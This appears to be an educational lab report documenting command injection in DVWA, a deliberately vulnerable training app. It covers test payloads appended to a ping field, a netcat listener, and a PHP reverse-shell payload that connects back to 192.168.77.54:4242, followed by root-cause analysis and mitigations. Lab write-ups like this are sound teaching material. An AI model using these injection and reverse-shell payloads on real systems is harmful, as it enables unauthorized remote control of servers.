@@ -1,0 +1,175 @@
+COMMAND INJECTION VULNERABILITY ASSESSMENT REPORT
+
+Target Application: DVWA (Damn Vulnerable Web Application)
+Vulnerability Type: Command Injection
+Security Level:
+Severity: Critical
+Testing Environment: Educational Lab
+
+INTRODUCTION
+
+This report documents the exploitation of a Command Injection vulnerability in DVWA at the Low security level.
+
+Command Injection occurs when user-supplied input is passed directly to the operating system shell without proper sanitization or validation. This allows attackers to execute arbitrary system commands on the target server.
+
+The assessment demonstrates how insecure handling of user input can lead to full system compromise.
+
+OBJECTIVE
+
+The objective of this assessment was to:
+
+Identify command injection vulnerabilities
+Execute arbitrary system commands
+Analyze server-side command execution behavior
+Demonstrate the risks associated with unsanitized input
+TOOLS USED
+Web Browser
+DVWA
+Netcat
+Linux Shell Commands
+VULNERABILITY DESCRIPTION
+
+The DVWA Command Injection module at the Low security level does not properly sanitize user input before passing it to the operating system shell.
+
+Because of this, attackers can append additional commands using shell operators such as:
+
+;
+&&
+|
+||
+
+This allows arbitrary command execution on the target server.
+
+EXPLOITATION PROCESS
+
+Step 1: Access the Command Injection Module
+
+The DVWA Command Injection page was opened from the vulnerabilities menu.
+
+The application provides an input field intended for IP addresses used in a ping command.
+
+Step 2: Test Normal Functionality
+
+A valid IP address was entered:
+
+127.0.0.1
+
+The application successfully returned ping results, confirming that user input was being processed by a system command.
+
+COMMAND INJECTION EXPLOITATION
+
+At the Low security level, the application does not filter or validate special shell characters.
+
+Additional system commands were appended to the input using shell separators.
+
+TEST PAYLOADS
+
+Payload 1:
+
+127.0.0.1; ls
+
+Purpose:
+List files and directories on the server.
+
+Payload 2:
+
+127.0.0.1 && hostname
+
+Purpose:
+Display the system hostname.
+
+Payload 3:
+
+127.0.0.1 | whoami
+
+Purpose:
+Identify the current system user running the web application.
+
+OBSERVED RESULTS
+
+The injected commands were successfully executed by the server operating system.
+
+The output of the commands was returned directly in the browser response.
+
+This confirmed that the application was vulnerable to command injection.
+
+REVERSE SHELL DEMONSTRATION
+
+A reverse shell was tested to demonstrate the potential severity of the vulnerability.
+
+Step 1: Start Netcat Listener
+
+The following command was executed on the attack machine:
+
+nc -nlvp 4242
+
+This opened a listener waiting for incoming shell connections.
+
+Step 2: Submit Reverse Shell Payload
+
+Payload Used:
+
+127.0.0.1;php -r '$sock=fsockopen("192.168.77.54",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Note:
+The IP address must be replaced with the attack machine's IP address.
+
+RESULT
+
+The server initiated a reverse connection to the attack machine.
+
+An interactive shell session was obtained successfully.
+
+This demonstrated that arbitrary remote command execution was possible through the vulnerable application.
+
+ROOT CAUSE
+
+The vulnerability exists because user input is directly passed to the operating system shell without:
+
+Input sanitization
+Command filtering
+Character escaping
+Validation controls
+
+The application trusts user-supplied data and executes it as part of a system command.
+
+SECURITY IMPACT
+
+An attacker exploiting this vulnerability may be able to:
+
+Execute arbitrary system commands
+Access sensitive files
+Gain remote shell access
+Escalate privileges
+Compromise the underlying server
+Move laterally within the network
+
+Because command execution occurs on the server itself, the impact is considered Critical.
+
+RECOMMENDATIONS
+
+The following mitigations are recommended:
+
+Validate User Input
+Only allow expected characters and formats.
+Avoid Direct Shell Execution
+Do not pass user input directly into system commands.
+Use Secure APIs
+Use safe programming functions instead of shell execution functions.
+Implement Input Sanitization
+Remove dangerous shell metacharacters.
+Apply Principle of Least Privilege
+Run web services with minimal system permissions.
+Disable Dangerous Functions
+Restrict functions such as:
+system()
+exec()
+shell_exec()
+passthru()
+Monitor System Activity
+Log and monitor suspicious command execution attempts.
+CONCLUSION
+
+The assessment confirmed that the DVWA application at the Low security level is critically vulnerable to Command Injection attacks.
+
+Because the application directly passes unsanitized input to the operating system shell, attackers can execute arbitrary commands and potentially gain full control of the target server.
